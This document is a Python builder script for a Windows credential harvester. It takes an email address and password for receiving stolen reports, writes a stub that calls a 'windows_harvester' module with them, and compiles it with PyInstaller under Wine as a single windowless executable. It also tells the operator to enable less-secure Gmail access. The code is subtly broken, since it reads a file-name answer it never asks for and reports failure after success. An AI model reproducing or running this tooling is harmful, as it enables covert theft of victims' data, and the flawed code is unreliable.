#!/usr/bin/env python3
import inquirer
import subprocess
import os

WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")

def write_injection(file_name, email, password):
    with open(file_name, "w+") as file:
        file.write("import windows_harvester\n")
        file.write("windows_harvester.harvest('" + email + "','" + password + "')\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def main():
    questions = [
        inquirer.Text("email", message="Enter email address to send reports to", validate=lambda _, x: x != ''),
        inquirer.Text("password", message="Enter password for given email address", validate=lambda _, x: x != '')
        ]
    answers = inquirer.prompt(questions, raise_keyboard_interrupt=True)
    write_injection(answers["file_name"], answers["email"], answers["password"])
    compile_for_windows(answers["file_name"])
    print("\n[+] Compilation complete.")
    print("[*] You must allow less secure applications in provided Gmail account.")
    print("[*] Do so here: https://myaccount.google.com/lesssecureapps")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[x] Compiler terminated by user")
    else:
        print("[-] Compilation failed")